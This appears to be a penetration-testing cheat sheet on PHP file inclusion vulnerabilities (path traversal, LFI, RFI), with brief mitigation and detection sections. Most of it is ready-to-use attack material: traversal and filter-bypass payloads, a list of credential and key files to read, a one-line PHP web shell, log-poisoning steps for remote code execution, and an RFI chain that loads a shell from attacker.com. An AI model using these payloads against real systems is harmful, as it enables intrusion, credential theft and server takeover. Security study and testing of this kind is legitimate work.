ğŸ—‚ï¸ **File Inclusion** is a vulnerability that allows an attacker to include (load) files from the local server or external sources into a web application.
- It happens when user input is improperly handled in file path operations.
- Two main types:
    - **LFI (Local File Inclusion)** â€“ Loads files from the same server.
    - **RFI (Remote File Inclusion)** â€“ Loads files from remote servers.

---
## ğŸªœ Path Traversal

### ğŸ“Œ What Is It?
**Path Traversal** (or Directory Traversal) allows attackers to break out of the intended directory and access arbitrary files on the server by injecting sequences like `../`.

It is a **core technique used in LFI**.
InÂ PHP, occurs when user's input is passed to functions like `file_get_contents` to read the content of a file.
### ğŸ§ª Payload Examples

```text
?page=../../../../etc/passwd
?page=..%2f..%2f..%2fetc%2fpasswd         # URL-encoded
?page=....//....//....//etc/passwd       # Filter bypass
?page=..\\..\\..\\windows\\win.ini       # Windows
```

---
### ğŸ§  Bypass Techniques

|Technique|Payload Example|
|---|---|
|Double encoding|`%252e%252e%252f` (decodes to `../../`)|
|Null byte injection (older PHP)|`../../etc/passwd%00`|
|Obfuscation|`....//etc/passwd`|
|Mixed slashes|`/etc\passwd` or `.\..\..\`|

### ğŸ“‚ Target Files

#### ğŸ§ Linux

| File                          | Purpose                                |
| ----------------------------- | -------------------------------------- |
| `/etc/passwd`                 | Lists system users                     |
| `/etc/shadow`                 | Password hashes (root-only)            |
| `/proc/self/environ`          | Environment vars (includes User-Agent) |
| `/var/log/apache2/access.log` | May contain log-injected payloads      |
| `config.php`                  | Web app secrets and credentials        |
| `/root/.ssh/id_rsa`           | Private SSH key                        |

#### ğŸªŸ Windows

|File|Purpose|
|---|---|
|`C:\Windows\win.ini`|Always exists (used to confirm LFI)|
|`C:\boot.ini`|Boot settings (legacy systems)|
|`C:\Users\Administrator\Desktop\flag.txt`|Sensitive data|
|`C:\xampp\mysql\data\mysql\user.MYD`|MySQL users (XAMPP)|

---

## ğŸ§ª Local File Inclusion (LFI)

### ğŸ“Œ What Is It?

**LFI** allows the attacker to include files from the server's local file system in the web applicationâ€™s response or execution.

Â WithÂ PHP, using functions such asÂ `include`,Â `require`,Â `include_once`, andÂ `require_once`Â often contribute to vulnerable web applications
### ğŸ§¨ Examples

***No directory specified:***
```php
<?PHP 
	include($_GET["lang"]);
?>
```
Payload can be absolute path (e.g. `/etc/passwd`)

***Specified Directory:***
```php
<?PHP 
	include("languages/". $_GET['lang']); 
?>
```
Payload must use relative path since the directory is specified. (e.g.: `../../../../etc/passwd`)

***Null Byte bypass***
`include("languages/../../../../../etc/passwd%00").".php");`Â which is equivalent toÂ `include("languages/../../../../../etc/passwd");`

>**Note:**Â the %00 trick is fixed and not working withÂ PHPÂ 5.3.4 and above.

***Filtered keywords bypass***
Using NullByte %00 or the current directory trick at the end of filtered keyword `/.`
``` html
?lang=/etc/passwd%00
?lang=/etc/passwd/.
```

***Common Path traversal Bypass***
In case of `../` gets stripped out:
```text
....//....//....//....//....//etc/passwd
```

***Others***:
```
?page=../../../../etc/passwd
?page=php://filter/convert.base64-encode/resource=index.php
?page=....//....//....//etc/passwd
```
### ğŸ§  Useful Tricks

- **Log Poisoning** â€“ Inject PHP code into logs (e.g. via User-Agent) and then include the log file to execute code.
- **Wrapper abuse** â€“ Use PHP streams like `php://filter`, `php://input`, `data://` to read or inject code.
##### Example: Log Poisoning for RCE

1. Set User-Agent to PHP payload:
    
    ```
    <?php system($_GET['cmd']); ?>
    ```
    
2. Access the log:
    
    ```
    ?page=/var/log/apache2/access.log&cmd=id
    ```
    

---

## ğŸŒ Remote File Inclusion (RFI)

### ğŸ“Œ What Is It?

**RFI** allows attackers to load and execute a script from a remote server.

- Requires `allow_url_include = On` in `php.ini`.
    

---

### ğŸ’¥ Exploitation Example

1. Payload:
    
    ```text
    ?page=http://attacker.com/shell.txt
    ```
    
2. Remote file (hosted on your server):
    
    ```php
    <?php system($_GET['cmd']); ?>
    ```
    
3. Execute:
    
    ```text
    ?page=http://attacker.com/shell.txt&cmd=whoami
    ```
    

---

## âš™ï¸ PHP Wrappers for LFI/RFI

|Wrapper|Description|
|---|---|
|`php://filter/convert.base64-encode/resource=index.php`|Dumps base64 source code|
|`php://input`|Reads raw POST body|
|`data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+`|Inline base64 payload|
|`expect://id`|Executes system commands (rare, must be enabled)|

---

## ğŸ›¡ï¸ Mitigation Techniques

### âœ… Input Validation & Whitelisting

- Use a **predefined list** of allowable files (not user-controlled).
    
- Avoid passing unsanitized user input into file paths.
    

### âœ… Path Normalization

- Use functions like `realpath()` or `basename()` to clean input.
    
- Reject input containing `../`, `%00`, `%2e%2e`, etc.
    

### âœ… Disable Dangerous PHP Settings

- Disable `allow_url_include`
    
- Consider disabling `allow_url_fopen`
    

### âœ… Use Safe Functions

- Use absolute paths.
    
- Avoid dynamic `include()`, `require()`, or `fopen()` based on user input.
    

---

## ğŸ” Detection Tips

- Look for URL parameters like:
    
    - `?page=`, `?file=`, `?template=`, `?lang=`
        
- Try path traversal payloads and monitor:
    
    - Response errors (e.g., â€œNo such fileâ€)
        
    - Content leaks (e.g., `/etc/passwd` content)
        
- Use wrappers like `php://filter` to dump source
    

---

## ğŸ§ª Example Exploitation Chain (LFI + RCE)

1. **Inject code into Apache access log:**
    
    - Send User-Agent:
        
        ```php
        <?php system($_GET['cmd']); ?>
        ```
        
2. **Access log file with command:**
    
    ```
    ?page=/var/log/apache2/access.log&cmd=ls
    ```
    
3. **Reverse Shell via RFI (if enabled):**
    
    ```
    ?page=http://yourip/shell.txt
    ```
    

---